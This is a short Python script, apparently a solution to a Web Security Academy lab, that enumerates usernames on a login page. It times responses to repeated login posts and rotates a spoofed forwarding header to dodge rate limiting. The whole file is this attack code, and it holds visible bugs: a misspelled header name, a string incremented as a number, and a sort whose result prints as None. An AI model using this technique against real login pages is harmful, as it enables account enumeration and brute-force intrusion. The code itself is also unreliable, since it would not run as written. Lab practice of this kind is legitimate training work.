import requests, signal, sys, string, time
from pwn import *

# Variables globales
URL = "https://0a9c00ed03c36c78c4e30b5f006e00d6.web-security-academy.net/login"

def def_handler(sig, frame):
    print("\n[+] Saliendo...")
    exit(1)
signal.signal(signal.SIGINT, def_handler)


def makeRequest(payload, num):
    data_post = {
        'username':'%s' % payload,
        'password': 'aafdasfdasfdasfdasfdasfdasfasdvcxvcxvxcvbbvcxgdsfgfds'
    }
    header = {"Cookie": "session=SdSLUbPwn5QgM5lVMxsMAZJ8LNQRQBpy", "X-Forwarder-For": "%d" % num, "Content-Type": "application/x-www-form-urlencoded"}
    r = requests.post(URL, data=data_post, headers=header)
    return r

if __name__ == "__main__":
    p1 = log.progress("Iniciando proceso de fuerza bruta")
    p2 = log.progress("Probando con: ")
    
    f = open("/home/darkarneus/Desktop/usernames.txt", "r")
    num = input("X-Forwarded-For desde el número: ")
    tiempos = []
    for i in f.readlines():
        num += 1
        payload = i.strip()
        time_start = time.time()
        r = makeRequest(payload, num)
        time_end = time.time()
        final_tiempo = time_end - time_start
        p2.status("Usuario: %s Tiempo de respuesta %d" % (i, final_tiempo))
        tiempos.append(final_tiempo)
    
    print(tiempos.sort())

